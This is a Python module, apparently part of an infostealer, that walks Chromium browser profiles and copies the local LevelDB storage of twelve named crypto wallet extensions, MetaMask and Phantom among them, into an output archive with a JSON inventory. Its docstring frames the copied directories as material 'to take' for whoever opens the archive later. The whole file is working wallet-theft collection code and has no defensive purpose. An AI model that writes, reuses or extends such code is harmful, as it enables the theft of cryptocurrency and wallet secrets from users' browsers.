"""Wallet extension inventory.

This module copies files. It does not parse a vault, derive a key or touch a seed
phrase. Every wallet extension keeps its state under
``Local Extension Settings/<extension id>`` as a LevelDB directory, and that
directory is the artifact: whoever opens the archive later has the same bytes the
extension had.

Extension identifiers are stable across stores and are the only reliable way to find
a wallet, because the display name lives inside the extension bundle. A wallet that
is installed but has never been opened has no settings directory and is not listed;
that is correct, there is nothing to take.

Bounded hard: per-file and per-wallet byte ceilings, because a single wallet with a
runaway log must not turn into a multi-gigabyte archive entry.
"""

from __future__ import annotations

import shutil
from pathlib import Path
from typing import Any, Final

from .. import log, util
from .browsers import chromium_roots, profile_dirs, slug

_MAX_FILES: Final[int] = 200
_MAX_FILE_BYTES: Final[int] = 8 * 1024 * 1024
_MAX_WALLET_BYTES: Final[int] = 64 * 1024 * 1024

# (extension id, label). Ids are the published ones and do not change between
# releases of the extension.
_WALLETS: Final[tuple[tuple[str, str], ...]] = (
    ("nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"),
    ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "phantom"),
    ("hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase"),
    ("egjidjbpglichdcondbcbdnbeeppgdph", "trust"),
    ("fhbohimaelbohpjbbldcngcnapndodjp", "binance"),
    ("dmkamcknogkgcdfhhbddcghachkejeap", "keplr"),
    ("ibnejdfjmmkpcnlpebklmnkoeoihofec", "tronlink"),
    ("acmacodkjbdgmoleebolmdjonilkdbch", "rabby"),
    ("fnjhmkhhmkbjkkabndcnnogagogbneec", "ronin"),
    ("mcohilncbfahbmgdjkbpemcciiolgcge", "okx"),
    ("ejbalbakoplchlghecdalmeeeajnimhm", "exodus"),
    ("lgmpcpglpngdoalbgeoldeajfclnhafa", "solflare"),
)


def _copy_tree(source: Path, destination: Path) -> tuple[int, int]:
    """Copy regular files, bounded. Returns (files copied, bytes copied)."""
    copied = 0
    total = 0

    try:
        items = sorted(source.iterdir(), key=lambda item: item.name)
    except OSError:
        log.logger.debug("wallets: cannot list %s", source, exc_info=True)
        return 0, 0

    for item in items:
        if copied >= _MAX_FILES:
            log.logger.debug("wallets: file cap reached in %s", source)
            break
        try:
            if not item.is_file():
                continue
            size = item.stat().st_size
        except OSError:
            continue
        if size <= 0 or size > _MAX_FILE_BYTES:
            continue
        if total + size > _MAX_WALLET_BYTES:
            log.logger.debug("wallets: byte cap reached in %s", source)
            break

        try:
            destination.mkdir(parents=True, exist_ok=True)
            shutil.copy2(item, destination / item.name)
        except OSError:
            log.logger.debug("wallets: copy failed for %s", item, exc_info=True)
            continue

        copied += 1
        total += size

    return copied, total


def _profile_wallets(profile: Path, browser: str, out_dir: Path) -> int:
    settings = profile / "Local Extension Settings"
    if not settings.is_dir():
        return 0

    target = out_dir / "wallets" / browser / slug(profile.name)
    entries: list[dict[str, Any]] = []

    for extension_id, label in _WALLETS:
        source = settings / extension_id
        if not source.is_dir():
            continue

        files, total = _copy_tree(source, target / label)
        if files == 0:
            continue

        entries.append(
            {
                "wallet": label,
                "extension": extension_id,
                "source": str(source),
                "files": files,
                "bytes": total,
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "wallets.json", entries):
        return 0
    return len(entries)


def run(out_dir: Path, cfg: Any) -> int:
    """Inventory installed wallets. Returns the number of wallets with data."""
    total = 0

    for root in chromium_roots():
        if not root.path.is_dir():
            continue
        dirs = [root.path] if root.profile_is_root else profile_dirs(root.path)
        for profile in dirs:
            total += _profile_wallets(profile, root.name, out_dir)

    return total


__all__ = ["run"]
